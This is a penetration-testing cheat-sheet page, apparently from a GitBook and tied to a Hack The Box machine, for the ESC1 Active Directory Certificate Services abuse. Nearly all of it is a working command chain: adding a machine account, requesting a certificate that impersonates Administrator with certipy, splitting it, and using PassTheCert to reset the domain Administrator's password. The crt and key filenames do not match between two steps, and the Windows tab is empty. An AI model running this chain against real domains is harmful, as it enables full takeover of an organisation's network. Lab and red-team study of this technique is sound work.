# ESC1

{% hint style="info" %}
You have enroll permission
{% endhint %}

{% tabs %}
{% tab title="Linux" %}
Create a new computer inside the domain

{% code overflow="wrap" %}
```
impacket-addcomputer  <DOMAIN>/<USER>:'<PASS>' -computer-name testComputer2$ -computer-pass TestPassword321
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Pasted image 20230719143908.png" alt=""><figcaption></figcaption></figure>

Check if has been created

```bash
crackmapexec smb <IP> -u 'testComputer2$' -p 'TestPassword321' -d <DOMAIN>
```

<figure><img src="../../../../.gitbook/assets/Pasted image 20230719150304.png" alt=""><figcaption></figcaption></figure>

We are generating a certificate for the newly created account

```bash
certipy req -u 'testComputer2$' -p 'TestPassword321' -dc-ip IP_DC_HERE -ca AUTHORITY-CA -template '<TEMPLATE>' -upn 'Administrator'
```

<figure><img src="../../../../.gitbook/assets/Pasted image 20230719150515.png" alt=""><figcaption></figcaption></figure>

Now divide the certificate in crt and key

```bash
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key
```

Now use [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) to abuse the certificate and set a new password for the account

```bash
python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip IP_DC_HERE -target administrator -new-pass
```
{% endtab %}

{% tab title="Windows" %}
//TODO
{% endtab %}
{% endtabs %}

